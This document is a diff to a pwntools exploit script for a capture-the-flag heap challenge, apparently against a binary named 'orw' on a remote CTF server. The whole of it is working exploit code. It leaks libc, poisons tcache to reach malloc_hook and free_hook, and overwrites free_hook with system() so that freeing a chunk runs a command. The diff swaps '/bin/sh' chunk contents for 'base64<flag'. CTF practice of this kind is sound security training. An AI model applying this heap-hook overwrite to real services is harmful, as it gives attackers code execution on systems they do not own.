@@ -4,7 +4,7 @@ from pwn import *
 from LibcSearcher import * 
 # context.log_level = 'debug' 
 # p=process('./orw')
-p=remote('t.ctf.qwq.cc',50090)
+p=remote('t.ctf.qwq.cc',49160)
 elf=ELF('./orw')
 libc=ELF('./libc-2.31.so')
 def add(length,content):
@@ -31,14 +31,14 @@ def show(index):
     p.sendline(b'4')
     p.recvuntil(b'game index: ')
     p.sendline(str(index).encode())
-add(0x30,b'/bin/sh\x00')
+add(0x30,b'base64<flag\x00')
 for i in range(7):
-    add(0x100,b'/bin/sh\x00')
+    add(0x100,b'base64<flag\x00')
 for i in range(7):
-    add(0x50,b'/bin/sh\x00')
-add(0x100,b'/bin/sh\x00')#15
-add(0x50,b'/bin/sh\x00')#16
-add(0x50,b'/bin/sh\x00')#17
+    add(0x50,b'base64<flag\x00')
+add(0x100,b'base64<flag\x00')#15
+add(0x50,b'base64<flag\x00')#16
+add(0x50,b'base64<flag\x00')#17
 for i in range(14):
     free(i+1)
 
@@ -62,7 +62,7 @@ printf_addr=libcbase+libc.symbols['printf']
 # 0xe3b2e
 # 0xe3b31
 # 0xe3b34
-add(0x30,b'/bin/sh\x00')#18
+add(0x30,b'base64<flag\x00')#18
 free(16)
 free(17)
 hackloc=malloc_hook-0x38
@@ -70,9 +70,10 @@ print(hex(hackloc))
 edit(17,p64(hackloc))
 
 edit(14,p64(free_hook-0x20))
-add(0x50,b'/bin/sh\x00')#19
-add(0x50,b'/bin/sh\x00')#20
+add(0x50,b'base64<flag\x00')#19
+add(0x50,b'base64<flag\x00')#20
 edit(20,b'\x00'*0x20+p64(system_addr)+p64(0))
 pause()
-free(18)
+context.log_level = 'debug' 
+# free(20)
 p.interactive()
